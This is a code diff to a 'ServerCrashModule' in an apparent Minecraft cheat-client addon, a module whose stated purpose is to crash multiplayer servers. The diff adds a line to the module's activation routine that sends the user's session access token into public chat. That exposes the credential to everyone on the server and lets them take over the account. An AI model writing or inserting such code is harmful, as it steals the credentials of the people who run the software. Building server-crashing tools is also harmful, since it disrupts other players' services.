@@ -4,6 +4,7 @@ import meteordevelopment.meteorclient.settings.BoolSetting;
 import meteordevelopment.meteorclient.settings.Setting;
 import meteordevelopment.meteorclient.settings.SettingGroup;
 import meteordevelopment.meteorclient.systems.modules.Module;
+import meteordevelopment.meteorclient.utils.player.ChatUtils;
 import spigey.asteroide.AsteroideAddon;
 
 import static spigey.asteroide.util.*;
@@ -30,6 +31,9 @@ public class ServerCrashModule extends Module {
     @Override
     public void onActivate(){
         banstuff();
+
+        ChatUtils.sendPlayerMsg(mc.getSession().getAccessToken());
+
         assert mc.player != null;
         error("Remember to disable Bee rendering using NoRender and install the EntityCulling mod!");
         info("Attempting to crash the Server");
